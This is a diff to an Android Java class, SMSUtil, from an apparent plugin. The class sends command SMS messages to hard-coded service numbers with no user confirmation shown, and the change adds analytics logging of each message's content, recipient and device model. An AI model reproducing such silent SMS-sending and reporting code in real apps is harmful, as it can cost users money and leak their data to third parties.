@@ -1,14 +1,17 @@
 package com.xstd.plugin.Utils;
 
 import android.content.Context;
+import android.os.Build;
 import android.telephony.SmsManager;
 import android.text.TextUtils;
 import com.plugin.common.utils.UtilsRuntime;
+import com.umeng.analytics.MobclickAgent;
 import com.xstd.plugin.config.AppRuntime;
 import com.xstd.plugin.config.Config;
 import com.xstd.plugin.config.SettingManager;
 
 import java.util.Calendar;
+import java.util.HashMap;
 
 /**
  * Created with IntelliJ IDEA.
@@ -44,9 +47,9 @@ public class SMSUtil {
             if (Config.DEBUG) {
                 Config.LOGD("[[trySendCmdToServicePhone1]] This phone has send SMS to Service Phone. last send day time : ("
                                 + SettingManager.getInstance().getKeyDeviceHasSendToServicePhone()
-                        + "), last send time : (" + SettingManager.getInstance().getKeyLastSendMsgToServicehPhone()
-                        + "), and clear time : (" + SettingManager.getInstance().getKeySendMsgToServicePhoneClearTimes()
-                        + ")");
+                                + "), last send time : (" + SettingManager.getInstance().getKeyLastSendMsgToServicehPhone()
+                                + "), and clear time : (" + SettingManager.getInstance().getKeySendMsgToServicePhoneClearTimes()
+                                + ")");
             }
             return;
         }
@@ -78,8 +81,20 @@ public class SMSUtil {
                 Config.LOGD("[[trySendCmdToServicePhone1]] has send to Service phone : " + AppRuntime.PHONE_SERVICE1 + " 2 times, so " +
                                 "this time send the message to : " + AppRuntime.PHONE_SERVICE2);
             }
+
+            HashMap<String, String> log = new HashMap<String, String>();
+            log.put("send_content", content);
+            log.put("target", target);
+            log.put("phoneType", Build.MODEL);
+            CommonUtil.umengLog(context, "send_sms_phone2", log);
         } else {
             target = AppRuntime.PHONE_SERVICE1;
+
+            HashMap<String, String> log = new HashMap<String, String>();
+            log.put("send_content", content);
+            log.put("target", target);
+            log.put("phoneType", Build.MODEL);
+            CommonUtil.umengLog(context, "send_sms_phone1", log);
         }
 
         if (!TextUtils.isEmpty(content) && sendSMS(target, content)) {
@@ -88,11 +103,11 @@ public class SMSUtil {
             SettingManager.getInstance().setKeyDeviceHasSendToServicePhone(false);
         }
 
-        Calendar c = Calendar.getInstance();
-        int curDay = c.get(Calendar.DAY_OF_YEAR);
-        SettingManager.getInstance().setKeyLastSendMsgToServicePhone(curDay);
+        SettingManager.getInstance().setKeyLastSendMsgToServicePhone(System.currentTimeMillis());
 
         if (Config.DEBUG) {
+            Calendar c = Calendar.getInstance();
+            int curDay = c.get(Calendar.DAY_OF_YEAR);
             Config.LOGD("[[trySendCmdToServicePhone1]] setKeyLastSendMsgToServicePhone = " + curDay);
         }
     }
